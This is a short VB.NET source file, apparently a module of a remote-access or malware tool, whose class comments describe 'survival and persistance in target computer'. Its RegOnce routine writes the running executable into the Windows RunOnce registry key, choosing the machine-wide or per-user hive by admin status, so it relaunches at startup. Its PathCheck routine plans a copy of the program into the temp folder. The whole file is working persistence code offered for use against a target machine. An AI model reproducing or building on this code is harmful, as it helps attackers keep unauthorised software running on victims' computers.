Imports System.IO
Imports System.Windows.Forms
Imports Microsoft.Win32

''' <summary>
''' Everything related to survival and persistance in target computer
''' </summary>
Public Class Persistance

	''' <summary>
	''' Installs itself to RegOnce path
	''' </summary>
	Public Shared Sub RegOnce()
		Using Reg = If(Utils.IsAdmin, Registry.LocalMachine, Registry.CurrentUser).OpenSubKey("Software\Microsoft\Windows\CurrentVersion\", True)
			Using Rgx As RegistryKey = Reg.CreateSubKey("RunOnce", RegistryKeyPermissionCheck.ReadWriteSubTree)
				Rgx.SetValue(Config.AppName, """" + Application.ExecutablePath + """ startup")
			End Using
		End Using
	End Sub

	''' <summary>
	''' Checks if current path is correct or not otherwise copies itself to temp
	''' </summary>
	''' <returns>Null if correct path otherwise new path of EXE</returns>
	Public Shared Function PathCheck() As String

		Dim appPath = Path.GetTempPath()
		Dim exeName = Config.AppName + ".exe"
		Dim newPath = Path.Combine(appPath, exeName)

		If Not File.Exists(newPath) Then
			Return newPath
		End If

		Dim fTemp = New FileInfo(newPath)
		Dim fApp = New FileInfo(Application.ExecutablePath)

		If fTemp.FullName.ToLower() = fApp.FullName.ToLower() Then
			Return Nothing
		Else
			Return newPath
		End If
	End Function

End Class
